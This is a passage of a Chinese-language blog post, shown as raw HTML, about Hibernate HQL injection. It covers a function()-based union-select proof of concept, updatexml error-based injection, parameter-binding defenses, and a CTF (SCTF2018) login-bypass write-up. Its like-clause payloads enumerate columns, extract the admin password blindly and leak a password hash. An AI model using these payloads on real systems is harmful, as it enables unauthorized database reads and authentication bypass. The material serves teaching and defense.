</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">function</span><span class="p">(</span><span class="s1">&#39;aaaa&#39;&#39;bbbb&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">aaaa</span><span class="s1">&#39;bbbb(1,1,1)  6.x版本</span></span></span></code></pre></td></tr></table>
</div>
</div><p>第一参数作为函数名，随后拼接一个括号，后面的参数则是括号里的内容</p>
<p>而<code>function()</code>函数的利用和<code>sql()</code>函数一样，是直接拼接在解析后的SQL语句中的，而且第一参数的内容没有任何限制</p>
<p>这样就可以构造一个可利用POC了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="o">?</span><span class="n">name</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; and function(&#39;</span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">union</span><span class="w"> </span><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="n">table_schema</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">information_schema</span><span class="p">.</span><span class="n">tables</span><span class="o">#</span><span class="s1">&#39;)=&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163303852.png" alt="image-20250312163303852" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163303852.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163303852.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163303852.png?size=large 2x" data-title="image-20250312163303852" style="--width: 1412px;--aspect-ratio: 1412 / 752;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163322417.png" alt="image-20250312163322417" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163322417.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163322417.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312163322417.png?size=large 2x" data-title="image-20250312163322417" style="--width: 992px;--aspect-ratio: 992 / 792;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里注意function函数会在后面添加一对括号，可以使用单行注释进行注释</p>
<p>通过function()方法，可以对任意表进行读取。</p>
<p>报错注入：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">name</span><span class="o">=</span><span class="n">test</span><span class="s1">&#39; and FUNCTION(&#39;</span><span class="n">updatexml</span><span class="s1">&#39;,1,concat(&#39;</span><span class="o">~</span><span class="s1">&#39;,user(),&#39;</span><span class="o">~</span><span class="s1">&#39;),1)=</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172725683.png" alt="image-20250312172725683" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172725683.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172725683.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172725683.png?size=large 2x" data-title="image-20250312172725683" style="--width: 1432px;--aspect-ratio: 1432 / 1266;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172902778.png" alt="image-20250312172902778" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172902778.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172902778.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/image-20250312172902778.png?size=large 2x" data-title="image-20250312172902778" style="--width: 1902px;--aspect-ratio: 1902 / 1054;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<h2 id="hql注入防御" class="heading-element"><span>HQL注入防御</span>
  <a href="#hql%e6%b3%a8%e5%85%a5%e9%98%b2%e5%be%a1" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p><strong>HQL参数名称绑定</strong></p>
<p>防御sql注入最好的办法就是预编译</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Query query=session.createQuery(“from User user where user.name=:customername and user:customerage=:age ”); 
</span></span><span class="line"><span class="cl">query.setString(“customername”,name); 
</span></span><span class="line"><span class="cl">query.setInteger(“customerage”,age); </span></span></code></pre></td></tr></table>
</div>
</div><p><strong>HQL参数位置邦定：</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Query query=session.createQuery(“from User user where user.name=? and user.age =? ”); 
</span></span><span class="line"><span class="cl">query.setString(0,name); 
</span></span><span class="line"><span class="cl">query.setInteger(1,age); </span></span></code></pre></td></tr></table>
</div>
</div><p><strong>setParameter()</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">String</span><span class="w"> </span><span class="n">hql</span><span class="o">=</span><span class="err">”</span><span class="n">from</span><span class="w"> </span><span class="n">User</span><span class="w"> </span><span class="n">user</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">user</span><span class="p">.</span><span class="na">name</span><span class="o">=</span><span class="p">:</span><span class="n">customername</span><span class="w"> </span><span class="err">”</span><span class="p">;</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">query</span><span class="o">=</span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="n">hql</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="p">.</span><span class="na">setParameter</span><span class="p">(</span><span class="err">“</span><span class="n">customername</span><span class="err">”</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">Hibernate</span><span class="p">.</span><span class="na">STRING</span><span class="p">);</span><span class="w"> </span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>setProperties()方法：</strong></p>
<p>setProperties()方法将命名参数与一个对象的属性值绑定在一起</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">Customer</span><span class="w"> </span><span class="n">customer</span><span class="o">=</span><span class="k">new</span><span class="w"> </span><span class="n">Customer</span><span class="p">();</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">customer</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="err">“</span><span class="n">pansl</span><span class="err">”</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">customer</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">80</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">Query</span><span class="w"> </span><span class="n">query</span><span class="o">=</span><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="err">“</span><span class="n">from</span><span class="w"> </span><span class="n">Customer</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">name</span><span class="o">=</span><span class="p">:</span><span class="n">name</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">c</span><span class="p">.</span><span class="na">age</span><span class="o">=</span><span class="p">:</span><span class="n">age</span><span class="w"> </span><span class="err">”</span><span class="p">);</span><span class="w"> 
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">query</span><span class="p">.</span><span class="na">setProperties</span><span class="p">(</span><span class="n">customer</span><span class="p">);</span><span class="w"> </span></span></span></code></pre></td></tr></table>
</div>
</div><p>setProperties()方法会自动将customer对象实例的属性值匹配到命名参数上，但是要求命名参数名称必须要与实体对象相应的属性同名。</p>
<h2 id="案例1-登录绕过" class="heading-element"><span>案例1-登录绕过</span>
  <a href="#%e6%a1%88%e4%be%8b1-%e7%99%bb%e5%bd%95%e7%bb%95%e8%bf%87" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h3 id="where语句注入" class="heading-element"><span>where语句注入</span>
  <a href="#where%e8%af%ad%e5%8f%a5%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>SCTF2018 : Zhuanxv这道题中</p>
<p>反编译后class看到hql语句</p>
<p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010210945030-347794294.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010210945030-347794294.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010210945030-347794294.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010210945030-347794294.png?size=large 2x" data-title="img" style="--width: 1133px;--aspect-ratio: 1133 / 408;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>前面审计出条件：用户名过滤空格与等号 所以注入语句用换行符 %0a</p>
<p>payload:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin%27%0Aor%0A%271%27%3E%270&#39;%0Aor%0Aname%0Alike%0A&#39;admin&amp;user.password=1</span></span></code></pre></td></tr></table>
</div>
</div><p>拼接后的语句：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;admin&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="o">&gt;</span><span class="s1">&#39;0&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;admin&amp;user.password=1&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;password&#39;</span></span></span></code></pre></td></tr></table>
</div>
</div><p><img loading="lazy" src="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010212206446-1035117605.png" alt="img" srcset="/posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010212206446-1035117605.png?size=small, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010212206446-1035117605.png?size=medium 1.5x, /posts/hibernate_hql_injection/resource/Hibernate-HQL%E6%B3%A8%E5%85%A5.assets/1545399-20191010212206446-1035117605.png?size=large 2x" data-title="img" style="--width: 1535px;--aspect-ratio: 1535 / 572;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>实现登录绕过</p>
<h3 id="like语句注入" class="heading-element"><span>like语句注入</span>
  <a href="#like%e8%af%ad%e5%8f%a5%e6%b3%a8%e5%85%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>还有一种是like语句百分号里注入 大同小异:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">session</span><span class="p">.</span><span class="na">createQuery</span><span class="p">(</span><span class="s">&#34;from Book where title like &#39;%&#34;</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">userInput</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="s">&#34;%&#39; and published = true&#34;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Payload :  userInput  为  <code>' or 1=1 or ''='</code></p>
<p><strong>列出所有条目</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>爆出隐藏的列</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">promoCode</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;A%&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">promoCode</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;B%&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="mi">1</span><span class="o">=</span><span class="mi">2</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span></span></span></code></pre></td></tr></table>
</div>
</div><p><strong>列出所有的列</strong></p>
<p>利用返回错误异常消息   列名不是Hibernate中实体定义的一部分，则其会触发异常</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">DOESNT_EXIST</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span></span></span></code></pre></td></tr></table>
</div>
</div><p>触发异常：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">org</span><span class="p">.</span><span class="na">hibernate</span><span class="p">.</span><span class="na">exception</span><span class="p">.</span><span class="na">SQLGrammarException</span><span class="p">:</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"> </span><span class="n">Column</span><span class="w"> </span><span class="s">&#34;DOESNT_EXIST&#34;</span><span class="w"> </span><span class="n">not</span><span class="w"> </span><span class="n">found</span><span class="p">;</span><span class="w"> </span><span class="n">SQL</span><span class="w"> </span><span class="n">statement</span><span class="p">:</span><span class="n">select</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">id</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">id21_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">author</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">author21_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">promoCode</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">promo3_21_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">title</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">title21_</span><span class="p">,</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">published</span><span class="w"> </span><span class="n">as</span><span class="w"> </span><span class="n">published21_</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="n">Book</span><span class="w"> </span><span class="n">book0_</span><span class="w"> </span><span class="n">where</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">title</span><span class="w"> </span><span class="n">like</span><span class="w"> </span><span class="sc">&#39;%&#39;</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">DOESNT_EXIST</span><span class="o">=</span><span class="sc">&#39;%&#39;</span><span class="w"> </span><span class="n">and</span><span class="w"> </span><span class="n">book0_</span><span class="p">.</span><span class="na">published</span><span class="o">=</span><span class="n">1</span><span class="w"> </span><span class="o">[</span><span class="n">42122</span><span class="o">-</span><span class="n">159</span><span class="o">]</span></span></span></code></pre></td></tr></table>
</div>
</div><p>通过该异常，可以看到Hibernate查询的列表名。</p>
<p><strong>盲注</strong></p>
<p>如果查询不用的表，镶嵌使用子查询。</p>
<p>例如，以下查询会从表中选择一条与“User”实体关联的项</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="k">substring</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="p">)</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;a&#39;</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span></span></span></code></pre></td></tr></table>
</div>
</div><p>之后就可以按常规的盲注模式进行盲注了。</p>
<p><strong>非盲注</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">from</span><span class="w"> </span><span class="n">Bookwhere</span><span class="w"> </span><span class="n">title</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%11&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="p">(</span><span class="k">select</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="k">User</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="n">username</span><span class="o">=</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span><span class="o">=</span><span class="mi">1</span><span class="w"> </span><span class="k">or</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">=</span><span class="s1">&#39;%&#39;</span><span class="w"> </span><span class="k">and</span><span class="w"> </span><span class="n">published</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">true</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Hibernate 将异常消息返回：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">Data</span><span class="w"> </span><span class="k">conversion</span><span class="w"> </span><span class="n">error</span><span class="w"> </span><span class="n">converting</span><span class="w"> </span><span class="s2">&#34;3f3ff0cdbfa0d515f8e3751e4ed98abe&#34;</span><span class="p">;</span><span class="w"> 
